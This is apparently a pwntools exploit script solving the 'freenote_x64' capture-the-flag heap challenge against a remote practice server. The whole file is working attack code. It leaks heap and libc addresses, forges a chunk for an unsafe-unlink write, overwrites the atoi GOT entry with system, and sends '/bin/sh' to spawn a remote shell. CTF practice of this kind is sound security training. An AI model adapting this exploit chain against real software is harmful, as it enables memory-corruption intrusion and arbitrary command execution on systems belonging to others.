from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-64.so"
# p = process([ld_path, "./freenote_x64"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 29894)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def show():
    sla("Your choice: ", "1")

def new(size, con):
    sla("Your choice: ", "2")
    sla("Length of new note: ", str(size))
    sa("Enter your note: ", con)

def edit(index, size, con):
    sla("Your choice: ", "3")
    sla("Note number: ", str(index))
    sla("Length of note: ", str(size))
    sa("Enter your note: ", con)

def free(index):
    sla("Your choice: ", "4")
    sla("Note number: ", str(index))


# leak heap and libc
new(0x80, cyclic(0x80))  # 0
new(0x80, cyclic(0x80))  # 1
new(0x80, cyclic(0x80))  # 2
new(0x80, cyclic(0x80))  # 3
new(0x80, cyclic(0x80))  # 4
free(1)
free(3)
new(0x8, "xxxxxxxx")
new(0x8, "xxxxxxxx")
show()
rud("xxxxxxxx")
heap_info = u64(rud("\n").ljust(8, b"\x00"))
print("heap: ", hex(heap_info))
rud("xxxxxxxx")
libc_info = u64(rud("\n").ljust(8, b"\x00"))
print("libc: ", hex(libc_info))

# count
libc = ELF(libc_path)
base = libc_info-libc.sym["__malloc_hook"]-0x68
print("base: ", hex(base))
heap_addr = heap_info-0x19a0
fd = heap_addr-0x18
bk = heap_addr-0x10

# unlink
free(1)
free(2)
free(3)
pad = p64(0x0)+p64(0x81)+p64(fd)+p64(bk)+cyclic(0x60)
pad += p64(0x80)+p64(0x90)
pad += cyclic(0x80)+p64(0x90)+p64(0x71)  # unlink will check the next chunk prev_inuse
edit(0, len(pad), pad) 
free(1)

# alter atoi to system
pro = ELF("./freenote_x64")
atoi_g = pro.got["atoi"]
system = base+libc.sym["system"]

pad = p64(0x1)+p64(0x1)+p64(0x8)+p64(atoi_g)
pad = pad.ljust(0x120, b"\x00")
edit(0, len(pad), pad)
edit(0, 0x8, p64(system))

# attack
sla("Your choice: ", "/bin/sh\x00")

shell()


